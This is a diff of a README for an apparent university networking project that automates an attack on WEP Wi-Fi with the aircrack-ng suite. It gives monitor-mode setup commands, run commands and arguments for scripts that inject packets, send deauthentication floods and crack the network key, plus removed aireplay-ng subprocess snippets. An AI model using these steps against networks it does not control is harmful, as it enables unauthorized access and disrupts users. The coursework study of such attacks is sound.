@@ -1,121 +1,42 @@
 # COMP4203 - Project
+This code utilizes the aircrack suite to sniff packets, inject packets, actively attack a WEP network, and crack the password for that network.
 
+## Requirements
+The following needs to be installed:
+`sudo apt-get install aircrack-ng`
 
+## Setup
+Before the program can be run, there needs to be a WEP network to run it on. This will most likely require older hardware as more modern ones have this encryption method disabled.
 
-## Workflow
+The code also needs to be run from a Linux device, since Windows devices cannot easily be put into monitor mode (required for injecting and sniffing packets not destined for it).
 
+To find your network interface card name, run: `ip link show`
 
-
-
-
-## To do:
-
-### Implement Key Ranking
-
-Could do this manually or use the algorithm `aircrack-ng` algorithm
-
-
-
-### Verify Access Point
-
-Verify that the access point is using the correct mode that enables the attack
-
-```python
-# aireplay-ng --fakeauth 0 -a C4:12:F5:7C:7C:0C -h d0:df:9a:8e:42:e9 wlp7s0
-fake_auth = subprocess.Popen(
-	['aireplay-ng', '--fakeauth 0', f'-a {access_point}', f'-h {source_mac}', iface], 
-	stdout = subprocess.PIPE)
+Run the following to put it into monitor mode:
+```
+sudo airmon-ng check kill
+sudo airmon-ng start <wireless_iface>
 ```
 
+## Running
+The following command will run the program from start to finish:
+`sudo python3 mp_wep_attacker.py -i <iface> -a <access_point_mac> -s <mac_of_attack_device> -c <channel> -r <IV target>`
 
+The following command will run the program without aircrack, but save the output files to be run on later:
+`sudo python3 automated_mp_wep_attacker.py -i <iface> -a <access_point_mac> -s <mac_of_attack_device> -c <channel> -r <IV target>`
 
-### Manage ARP Packets
-
-Run the following passively until correct packets are found from the created requests?
-
-```python
-# aireplay-ng --arpreplay -b C4:12:F5:7C:7C:0C -h d0:df:9a:8e:42:e9 wlp7s0
-arpreplay = subprocess.Popen(['aireplay-ng', '--arpreplay', f'-b {access_point}', f'-h {source_mac}', iface], stdout = subprocess.PIPE)
+## Information
+### Arguments
+```
+"-i", "--interface", help="interface to sniff and send packets from", required=True)
+"-a", "--access_point", help="MAC address of the access point, also known as the BSSID of the network.", required=True)
+"-s", "--source", help="MAC address of the device injecting the packets. run ifconfig to find it", required=True)
+"-c", "--channel", help="Channel that target network is operation on.", required=True)
+"-r", "--captured_arp_packets", help="Number of IVs to capture before attempting to crack password.", required=True)
+"-p", "--packets", help="packets per second to inject", default=500)
+"-t", "--target", help="MAC address of the target device for the de-auth attack, default is broadcast", default='ff:ff:ff:ff:ff:ff')
+"-n", "--number_deauth", help="Number of de-auth packets to send per batch", default=25)
 ```
 
-
-
-### Start Attack
-
-After everything else is done (right number of packets captured) start cracking...
-
-```python
-# aircrack-ng <file_name>
-aircrack = subprocess.Popen(['airodump-ng', 'output.cap'], stdout = subprocess.PIPE)
-```
-
-
-
-### Allow Selecting Any Interface?
-
-Might be able to use 2 interfaces if you are on a wired connection and have a network card I guess... Could make it faster
-
-```python
-iface = 'wlan0'
-```
-
-
-
-### Threadding
-
-Run line 101 happens first, wait until completed
-
-Start line 115 constantly running until IV count reaches threshold, 20k?
-
-Start running line 114
-
-Line 103 constantly running 
-
-Line 106 loop should run until we successfully deauthenticate once
-
-
-
-## Report Structure
-
-link to the doc ryan made instead
-
-```
-- Title page
-    - Title
-    - Names
-    - Course
-    - Date 
-  
-- Abstract? 
-
-- Table of contents + list of figures + list of tabless...
-
-- Introduction
-    - Motivation
-    - Purpose
-    - Description and domain
-    
-- Literature review
-    - Talk about that paper and how it works...
-    
-- Design
-    - Approach and discuss logic...
-    
-- Implementation
-    - Talk about our specific code
-        - Deauth
-        - Key ranking
-    - Talk about limitations
-    
-- Results
-    - Talk about simulations we ran and discuss results
-    - Compare performance against existing paper and against goals
-
-- Conclusion
-    - Conclude that the paper was valid
-
-- References
-
-- Appendices
-```
-
+### Gathering data
+`sudo airodump-ng <iface>`
